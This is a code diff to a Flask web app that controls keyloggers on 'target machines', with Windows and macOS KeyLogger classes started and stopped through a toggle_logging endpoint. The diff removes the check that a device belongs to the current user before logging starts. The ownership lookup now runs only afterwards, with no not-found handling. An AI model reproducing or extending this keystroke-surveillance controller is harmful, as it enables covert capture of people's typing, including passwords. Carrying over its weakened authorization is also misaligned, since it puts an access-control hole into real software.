@@ -430,9 +430,11 @@ def get_target_machines_list():
 def get_keylogger_class():
     system = platform.system().lower()
     if system == 'windows':
-        return WindowsKeyLogger
-    elif system == 'darwin':  # macOS
-        return MacKeyLogger
+        from keylogger.windows_keylogger import KeyLogger
+        return KeyLogger
+    elif system == 'darwin':
+        from keylogger.macos_keylogger import KeyLogger
+        return KeyLogger
     else:
         raise NotImplementedError(f"Keylogger not implemented for {system}")
 
@@ -444,20 +446,14 @@ def toggle_logging():
     action = data.get('action')
     
     try:
-        device = Device.query.filter_by(device_id=device_id, user_id=current_user.id).first()
-        if not device:
-            return jsonify({"error": "Device not found"}), 404
-
-        # Check if device ID matches the current OS
-        is_windows_device = device_id.startswith('WIN-')
-        is_windows_system = platform.system().lower() == 'windows'
-        
-        if is_windows_device != is_windows_system:
+        # Only allow operations on devices matching current OS
+        current_os = platform.system().lower()
+        if (current_os == 'windows' and not device_id.startswith('WIN-')) or \
+           (current_os == 'darwin' and not device_id.startswith('MAC-')):
             return jsonify({
                 "error": "Device type doesn't match current operating system"
             }), 400
-            
-        # Get the appropriate keylogger class
+
         KeyLoggerClass = get_keylogger_class()
         
         if not hasattr(app, 'keyloggers'):
@@ -469,6 +465,7 @@ def toggle_logging():
                 app.keyloggers[device_id] = KeyLoggerClass(db_path)
             
             result = app.keyloggers[device_id].start_logging(device_id)
+            device = Device.query.filter_by(device_id=device_id, user_id=current_user.id).first()
             device.is_active = True
             db.session.commit()
             return jsonify({"message": result, "is_active": True})
@@ -476,6 +473,7 @@ def toggle_logging():
         elif action == 'stop':
             if device_id in app.keyloggers:
                 result = app.keyloggers[device_id].stop_logging()
+                device = Device.query.filter_by(device_id=device_id, user_id=current_user.id).first()
                 device.is_active = False
                 db.session.commit()
                 return jsonify({"message": result, "is_active": False})
